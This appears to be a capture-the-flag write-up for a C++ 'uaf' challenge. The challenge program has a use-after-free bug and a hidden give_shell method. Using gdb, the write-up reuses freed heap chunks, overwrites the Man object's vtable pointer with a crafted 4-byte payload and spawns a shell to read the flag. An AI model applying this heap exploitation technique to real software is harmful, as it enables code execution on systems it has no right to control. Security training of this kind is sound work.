# Uaf

Let's take a look at the code:

```c++
class Human{
    private:
        virtual void give_shell(){
            system("/bin/sh");
        }
    protected:
        int age;
        string name;
    public:
        virtual void introduce(){
            cout << "My name is " << name << endl;
            cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
    public:
        Man(string name, int age){
            this->name = name;
            this->age = age;
        }
        virtual void introduce(){
            Human::introduce();
            cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
    public:
        Woman(string name, int age){
            this->name = name;
            this->age = age;
        }
        virtual void introduce(){
            Human::introduce();
            cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
    Human* m = new Man("Jack", 25);
    Human* w = new Woman("Jill", 21);

    size_t len;
    char* data;
    unsigned int op;
    while(1){
        cout << "1. use\n2. after\n3. free\n";
        cin >> op;

        switch(op){
            case 1:
                m->introduce();
                w->introduce();
                break;
            case 2:
                len = atoi(argv[1]);
                data = new char[len];
                read(open(argv[2], O_RDONLY), data, len);
                cout << "your data is allocated" << endl;
                break;
            case 3:
                delete m;
                delete w;
                break;
            default:
                break;
        }
    }

    return 0;	
}
```

There is a use-after-free bug there. Since we are able to free the object (option 3), allocate data (option 2) and use the object (option 1), we control a cycle of allocations/deallocations which can probably be exploited by the fact that we also control the contents of the allocated data. Perhaps we can replace the free'd objects in memory somehow.

In `C++`, there's the concept of a `virtual method`: it's any method that can be overwritten in a child class of a base class, maintaining both methods so the correct method to call can be resolved by the language at runtime using a `virtual table`.

Each class containing a `virtual method` will have a `virtual table`, which is simply a list of pointers to the methods it may have to call, whether they are from the base or the child classes.

What we have to do here, then, is shift the pointer to Man's virtual table so that the call to the `introduce` entry actually calls the `give_shell` entry.

Let's take a look at what happens before the calls to `introduce`:

```bash
$ gdb uaf
>>> disas main
[...]
0x0000000000400fcd <+265>:	mov    rax,QWORD PTR [rbp-0x38]
0x0000000000400fd1 <+269>:	mov    rax,QWORD PTR [rax]
0x0000000000400fd4 <+272>:	add    rax,0x8
0x0000000000400fd8 <+276>:	mov    rdx,QWORD PTR [rax]
0x0000000000400fdb <+279>:	mov    rax,QWORD PTR [rbp-0x38]
0x0000000000400fdf <+283>:	mov    rdi,rax
0x0000000000400fe2 <+286>:	call   rdx
0x0000000000400fe4 <+288>:	mov    rax,QWORD PTR [rbp-0x30]
0x0000000000400fe8 <+292>:	mov    rax,QWORD PTR [rax]
0x0000000000400feb <+295>:	add    rax,0x8
0x0000000000400fef <+299>:	mov    rdx,QWORD PTR [rax]
0x0000000000400ff2 <+302>:	mov    rax,QWORD PTR [rbp-0x30]
0x0000000000400ff6 <+306>:	mov    rdi,rax
0x0000000000400ff9 <+309>:	call   rdx
[...]
```

The first 7 lines are for m->introduce(), while the last 7 are for w->introduce().
What's going on here?

Well, the first line puts the object into `rax`. The first member of the object, in this implementation, is the pointer to the vtable. The second line puts the vtable into `rax`. It then adds `0x8` to it because that's the offset between the first member of the vtable and `introduce`.

The requested method is then put into `rdx` and the object itself is moved into `rdi` for the `this` pointer. Then rdx, `introduce`, is called.

Sounds good.

Let's put a few breakpoints and figure out important addresses:

```bash
>>> b *main+265
Breakpoint 1 at 0x400fcd
>>> b *main+288
Breakpoint 2 at 0x400fe4
>>> r
1. use
2. after
3. free
1
Breakpoint 1, 0x0000000000400fcd in main ()
>>> x $rbp-0x38
0x7fffffffdaf8:	0x00614c50
>>> x 0x00614c50
0x614c50:	0x00401570
>>> c
Breakpoint 2, 0x0000000000400fe4 in main ()
>>> x $rbp-0x30
0x7fffffffdb00:	0x00614ca0
>>> x 0x00614ca0
0x614ca0:	0x00401550
```

We have the addresses of Man (`0x00614c50`), Woman (`0x00614ca0`) and their vtables (`0x00401570` and `0x00401550`).

Now let's try to free the objects, allocate 4 bytes and see what happens to the registers before the call to `read`, as one of them should hold the destination parameter. We can also know our registers of interest beforehand by knowing our [calling convention](http://agner.org/optimize/calling_conventions.pdf), which in this case is `64 bit Linux`.

We now know the parameters are going to be put into `rdi`, `rsi`, `rdx`, [...], in this order. The second parameter of `read` is the destination, thus we need to check `rsi`.

```bash
$ echo -en "\x00\x00\x00\x00" > bytes
$ gdb uaf
>>> b *main+399
Breakpoint 1 at 0x401053
>>> r 4 bytes
1. use
2. after
3. free
3
1. use
2. after
3. free
2
Breakpoint 1, 0x0000000000401053 in main ()
>>> p/x $rsi
$1 = 0x614ca0
```

Wait... But this is the address of the Woman object!
Our allocator has taken advantage of the most recently free'd chunk in memory to store our data, which means we can overwrite the pointer to Woman's vtable.
Let's keep going and allocate data again to see whether we can also change the Man object.

```bash
>>> c
your data is allocated
1. use
2. after
3. free
2
Breakpoint 1, 0x0000000000401053 in main ()
>>> p/x $rsi
$2 = 0x614c50
```

Now we can also overwrite the pointer to Man's vtable.
Let's check what's in Man's vtable:

```bash
>>> x/4x 0x00401570
0x401570 <_ZTV3Man+16>:	0x0040117a	0x00000000	0x004012d2	0x00000000
>>> x 0x0040117a
0x40117a <_ZN5Human10give_shellEv>:	0xe5894855
>>> x 0x004012d2
0x4012d2 <_ZN3Man9introduceEv>:	0xe5894855
```

But what is it that we have to write to the pointer to the vtable in order to redirect execution to `give_shell`?
If we write `0x00401570`-`0x8` (`0x00401568`) to `0x614c50`, vtable + 0x8 is going to point to `give_shell` and we can get our flag:

```bash
$ echo -en "\x68\x15\x40\x00" > payload
$ ./uaf 4 payload
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
sh-4.4$ cat flag
```

Also notice that you'll have to exit twice to come back to the menu loop, because Woman's call was also redirected to Man's give_shell entry. :)
